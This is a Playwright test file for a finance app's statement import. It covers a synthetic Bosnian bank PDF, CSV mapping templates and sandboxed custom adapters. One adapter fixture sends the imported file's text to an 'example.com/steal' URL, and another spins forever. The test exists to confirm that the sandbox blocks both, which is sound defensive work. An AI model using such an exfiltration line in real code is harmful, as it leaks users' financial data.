import { readFileSync } from 'node:fs';
import { expect, type Page, test } from '@playwright/test';
import { onboardLocal, selectByText } from '../lib/app';

const FIX = '../../packages/test-fixtures/imports';

async function parse(
  page: Page,
  account: string,
  files: Parameters<Page['setInputFiles']>[1],
  importer?: string,
) {
  await page.goto('/import');
  await selectByText(page, 'Account', account);
  if (importer) await selectByText(page, 'Importer', importer);
  await page.locator('input[type=file][multiple]').setInputFiles(files);
  await page.getByRole('button', { name: 'Parse files' }).click();
}

async function stage(page: Page, name: string) {
  const card = page.getByRole('article', { name });
  await card.getByRole('button', { name: 'Stage for review' }).click();
  await expect(card.getByRole('button', { name: /^Commit \d+ transactions$/ })).toBeEnabled();
  return card;
}

async function commit(card: import('@playwright/test').Locator) {
  const btn = card.getByRole('button', { name: /^Commit \d+ transactions$/ });
  const n = Number((await btn.textContent())?.match(/\d+/)?.[0]);
  await btn.click();
  await expect(card.getByText('committed', { exact: true })).toBeVisible();
  return n;
}

test('Raiffeisen BiH statement (synthetic PDF): detected, balanced, opening balance, committed', async ({
  page,
}) => {
  await onboardLocal(page, [{ name: 'Raiffeisen tekući', type: 'checking', currency: 'BAM' }]);
  await parse(page, 'Raiffeisen tekući', `${FIX}/raiffeisen-bih/izvod-synthetic.pdf`);
  const card = page.getByRole('article', { name: 'izvod-synthetic.pdf' });
  await expect(card).toContainText(/Raiffeisen/);
  await expect(card).toContainText(/2025-03-01–2025-03-31: balances/); // opening + rows = closing
  await expect(card).toContainText(/Running balances .*consistent/);
  await card.getByRole('button', { name: /Set opening balance/ }).click();
  await expect(card.getByRole('button', { name: /Set opening balance/ })).toBeHidden();
  const staged = await stage(page, 'izvod-synthetic.pdf');
  expect(await commit(staged)).toBe(11);
  await page.goto('/transactions');
  await expect(page.getByRole('row', { name: /SOPING CENTAR/ })).toBeVisible();
  await expect(page.getByRole('row', { name: /PLATA PRIMJER FIRMA/ })).toBeVisible();
  await page.goto('/accounts');
  await expect(page.getByRole('main').getByText('BAM 58.16').first()).toBeVisible(); // closing balance
});

test('merchant template: saved from an import row, auto-applied to the next statement', async ({
  page,
}) => {
  await onboardLocal(page, [{ name: 'CSV bank', type: 'checking', currency: 'BAM' }]);
  await page.goto('/import?tab=mapping');
  await page.getByText('Import template JSON').click();
  await page
    .getByLabel('Template JSON')
    .fill(readFileSync(`${FIX}/templates/primjer-banka-csv.json`, 'utf8'));
  await page.getByRole('button', { name: 'Load' }).click();
  await page.getByRole('button', { name: 'Save template' }).click();
  await expect(page.getByText('Primjer Banka CSV (synthetic example)').first()).toBeVisible();

  await page.goto('/import');
  await selectByText(page, 'Account', 'CSV bank');
  await selectByText(page, 'Mapping template', 'Primjer Banka CSV');
  await page
    .locator('input[type=file][multiple]')
    .setInputFiles(`${FIX}/csv/primjer-banka-utf8.csv`);
  await page.getByRole('button', { name: 'Parse files' }).click();
  const first = await stage(page, 'primjer-banka-utf8.csv');
  const row = first.getByRole('row', { name: /Ćevapi i čaj/ });
  await selectByText(
    page,
    (await row.getByRole('combobox').first().getAttribute('aria-label')) as string,
    'Restaurants',
  );
  page.once('dialog', (d) => d.accept('Željo'));
  await row.getByRole('button', { name: 'Save merchant' }).click();
  await expect(row).toContainText('Željo');
  await commit(first);

  // next month's statement from the same bank: the merchant and its category are pre-filled
  const csv = [
    'Primjer Banka d.d. - izvod po računu',
    'Račun: 000-SYNTH-001;;;;;;',
    'Datum;Datum valute;Opis;Primalac;Duguje;Potražuje;Stanje;Referenca',
    '04.02.2025;04.02.2025;Ručak;Ćevabdžinica Željo;22,00;;4.297,30;R-010',
    '06.02.2025;06.02.2025;Kupovina;Trgovina Šećer;10,00;;4.287,30;R-011',
  ].join('\n');
  await page.goto('/import');
  await selectByText(page, 'Account', 'CSV bank');
  await selectByText(page, 'Mapping template', 'Primjer Banka CSV');
  await page
    .locator('input[type=file][multiple]')
    .setInputFiles({ name: 'februar.csv', mimeType: 'text/csv', buffer: Buffer.from(csv, 'utf8') });
  await page.getByRole('button', { name: 'Parse files' }).click();
  const second = await stage(page, 'februar.csv');
  const lunch = second.getByRole('row', { name: /Ručak/ });
  await expect(lunch).toContainText('Željo');
  await expect(lunch.getByRole('combobox').first().locator('option:checked')).toHaveText(
    /Restaurants/,
  );
  await expect(
    second
      .getByRole('row', { name: /Trgovina Šećer/ })
      .getByRole('combobox')
      .first()
      .locator('option:checked'),
  ).toHaveText(/Uncategorized/);
  await commit(second);
  await page.goto('/transactions');
  await expect(page.getByRole('row', { name: /Ručak/ })).toContainText('Restaurants');
});

const ADAPTER_OK = `function parse(input) {
  const lines = input.text.trim().split(/\\r?\\n/).slice(1);
  return { records: lines.map((l) => { const [date, description, amount] = l.split(';');
    return { postingDate: date, description, amount, currency: 'BAM' }; }) };
}`;
const ADAPTER_NET = `function parse(input) { fetch('https://example.com/steal?d=' + input.text); return { records: [] }; }`;
const ADAPTER_SPIN = `function parse(input) { for (;;) {} }`;

async function addAdapter(page: Page, id: string, name: string, code: string) {
  await page.goto('/import?tab=adapters');
  await page.getByRole('button', { name: 'New adapter' }).click();
  await page.getByLabel('Name', { exact: true }).fill(name);
  await page.getByLabel('Id', { exact: true }).fill(id);
  await page.getByLabel('Code', { exact: true }).fill(code);
  await page.getByRole('checkbox', { name: /I reviewed this code/ }).check();
  await page.getByRole('button', { name: 'Save and allow' }).click();
  await expect(page.getByText(`custom-${id}`)).toBeVisible();
}

test('custom sandboxed adapter: parses its format; network access and endless loops are stopped', async ({
  page,
}) => {
  await onboardLocal(page, [{ name: 'Adapter bank', type: 'checking', currency: 'BAM' }]);
  await addAdapter(page, 'semicolon', 'Semicolon bank', ADAPTER_OK);
  await addAdapter(page, 'leaky', 'Leaky bank', ADAPTER_NET);
  await addAdapter(page, 'spin', 'Spinning bank', ADAPTER_SPIN);
  const file = (name: string) => ({
    name,
    mimeType: 'text/csv',
    buffer: Buffer.from(
      'date;description;amount\n2025-05-02;Pekara Čelik;-3.20\n2025-05-03;Uplata;150.00\n',
      'utf8',
    ),
  });

  const outbound: string[] = [];
  page.on('request', (r) => {
    if (/^(https?|wss?):/.test(r.url()) && !r.url().startsWith(new URL(page.url()).origin))
      outbound.push(r.url());
  });
  await parse(page, 'Adapter bank', file('leaky.csv'), 'Custom: Leaky bank');
  await expect(page.getByRole('article', { name: 'leaky.csv' })).toContainText(
    /adapter error: .*fetch/i,
  );
  expect(outbound).toEqual([]);

  const t0 = Date.now();
  await parse(page, 'Adapter bank', file('spin.csv'), 'Custom: Spinning bank');
  await expect(page.getByRole('article', { name: 'spin.csv' })).toContainText(
    /exceeded \d+ ms of CPU time|did not answer/i,
    { timeout: 30_000 },
  );
  expect(Date.now() - t0).toBeLessThan(25_000);

  await parse(page, 'Adapter bank', file('ok.csv'), 'Custom: Semicolon bank');
  const card = await stage(page, 'ok.csv');
  expect(await commit(card)).toBe(2);
  await page.goto('/transactions');
  await expect(page.getByRole('row', { name: /Pekara Čelik/ })).toBeVisible();
});
